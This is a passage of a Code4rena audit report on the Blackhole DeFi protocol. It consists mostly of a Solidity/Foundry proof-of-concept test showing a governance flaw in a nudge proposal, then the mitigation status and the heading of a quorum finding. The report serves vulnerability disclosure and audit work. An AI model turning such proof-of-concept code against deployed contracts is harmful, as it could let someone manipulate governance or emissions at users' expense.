<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">AutoVotingEscrowManager</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">avm</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">VotingEscrow</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">votingEscrow</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">VoterV3</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">voter</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">GaugeManager</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">gaugeManager</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">GaugeFactory</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">gaugeFactory</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PairGenerator</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">pairGenerator</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PairFactory</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">pairFactory_1</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PairFactory</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">pairFactory_2CL</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">GaugeFactoryCL</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">BlackGovernor</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">blackGovernor</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">admin</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0xAD</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">protocol</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0x1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">userA</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0xA</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">userB</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0xB</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setUp</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">Black</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">permissionsRegistry</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PermissionsRegistry</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">GARole</span><span class="mtk1"> = </span><span class="mtk11">string</span><span class="mtk1">(</span><span class="mtk11">bytes</span><span class="mtk1">(</span><span class="mtk8">"GAUGE_ADMIN"</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">permissionsRegistry</span><span class="mtk1">.</span><span class="mtk11">setRoleFor</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">, </span><span class="mtk12">GARole</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">tokenHandler</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">TokenHandler</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">voter</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">VoterV3</span><span class="mtk1">();</span><span class="mtk3">//needs to be initialized</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">avm</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">AutoVotingEscrowManager</span><span class="mtk1">();</span><span class="mtk3">//needs to be initialized</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">votingEscrow</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">VotingEscrow</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">black</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">avm</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">rewardsDistributor</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">RewardsDistributor</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">GaugeFactoryCL</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeFactory</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">GaugeFactory</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairGenerator</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PairGenerator</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_1</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PairFactory</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_1</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairGenerator</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_2CL</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PairFactory</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_2CL</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairGenerator</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">gaugeManager</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">GaugeManager</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">tokenHandler</span><span class="mtk1">),</span><span class="mtk11">address</span><span class="mtk1">( </span><span class="mtk12">gaugeFactory</span><span class="mtk1">),</span><span class="mtk11">address</span><span class="mtk1">( </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairFactory_1</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairFactory_2CL</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">avm</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">),</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">voter</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">rewardsDistributor</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">minterUpgradeable</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">MinterUpgradeable</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">gaugeManager</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">rewardsDistributor</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">blackGovernor</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">BlackGovernor</span><span class="mtk1">(</span><span class="mtk11">IBlackHoleVotes</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">setBlackGovernor</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">blackGovernor</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">voter</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">VoterV3</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">voter</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">tokenHandler</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">gaugeManager</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">rewardsDistributor</span><span class="mtk1">.</span><span class="mtk11">setDepositor</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">setVoter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">voter</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">setMinter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">, </span><span class="mtk7">10_000_000e18</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">setMinter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">stopPrank</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">test_statusNotUpdatingVote</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">claimants</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">amounts</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">.</span><span class="mtk11">_initialize</span><span class="mtk1">(</span><span class="mtk12">claimants</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">);</span><span class="mtk3">//zero % ownership of top protcols</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">userABal</span><span class="mtk1"> = </span><span class="mtk7">1_000_000e18</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">userA</span><span class="mtk1">, </span><span class="mtk12">userABal</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">stopPrank</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">userA</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">WEEK</span><span class="mtk1"> = </span><span class="mtk7">1800</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">for</span><span class="mtk1">(</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">&lt; </span><span class="mtk7">67</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">           </span><span class="mtk11">skip</span><span class="mtk1">(</span><span class="mtk12">WEEK</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">.</span><span class="mtk11">update_period</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">             </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">currentEpoch</span><span class="mtk1"> = </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">.</span><span class="mtk11">epochCount</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">weekly</span><span class="mtk1"> = </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">.</span><span class="mtk11">weekly</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">         </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">votingEscrow</span><span class="mtk1">.</span><span class="mtk11">create_lock</span><span class="mtk1">(</span><span class="mtk12">userABal</span><span class="mtk1">, </span><span class="mtk7">4</span><span class="mtk1"> * </span><span class="mtk7">365</span><span class="mtk1"> </span><span class="mtk12">days</span><span class="mtk1">, </span><span class="mtk4">true</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">skip</span><span class="mtk1">(</span><span class="mtk7">3600</span><span class="mtk1">); </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">targets</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">address</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">values</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">uint256</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bytes</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">calldatas</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">bytes</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">targets</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">values</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">calldatas</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk12">abi</span><span class="mtk1">.</span><span class="mtk11">encodeWithSelector</span><span class="mtk1">(</span><span class="mtk12">IMinter</span><span class="mtk1">.</span><span class="mtk12">nudge</span><span class="mtk1">.</span><span class="mtk12">selector</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk12">epochTimehash</span><span class="mtk1"> = </span><span class="mtk11">bytes32</span><span class="mtk1">(</span><span class="mtk12">BlackTimeLibrary</span><span class="mtk1">.</span><span class="mtk11">epochNext</span><span class="mtk1">(</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1"> = </span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">propose</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">targets</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">values</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">calldatas</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">"Nudge proposal"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">skip</span><span class="mtk1">(</span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">votingDelay</span><span class="mtk1">()+</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">castVote</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">againstVotes</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">forVotes</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">abstainVotes</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        )= </span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">proposalVotes</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"Against Votes: "</span><span class="mtk1">, </span><span class="mtk12">againstVotes</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"For Votes: "</span><span class="mtk1">, </span><span class="mtk12">forVotes</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"Abstain Votes: "</span><span class="mtk1">, </span><span class="mtk12">abstainVotes</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">skip</span><span class="mtk1">(</span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">votingPeriod</span><span class="mtk1">() + </span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">execute</span><span class="mtk1">(</span><span class="mtk12">targets</span><span class="mtk1">, </span><span class="mtk12">values</span><span class="mtk1">, </span><span class="mtk12">calldatas</span><span class="mtk1">, </span><span class="mtk12">epochTimehash</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">//Look at the logs and status of the Governor</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-42">rayss</a>, <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-10">lonelybones</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-33">maxvzuvex</a>.</p>
<hr>
<h2 style="position:relative;" id="m-19-quorum-does-not-include-the-againstvotes-leading-to-emissions-rate-staying-the-same-even-if-it-should-decrease"><a class="anchor before" aria-label="m 19 quorum does not include the againstvotes leading to emissions rate staying the same even if it should decrease permalink" href="#m-19-quorum-does-not-include-the-againstvotes-leading-to-emissions-rate-staying-the-same-even-if-it-should-decrease"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-306">[M-19] Quorum does not include the <code>againstVotes</code> leading to emissions rate staying the same even if it should decrease</a></h2>
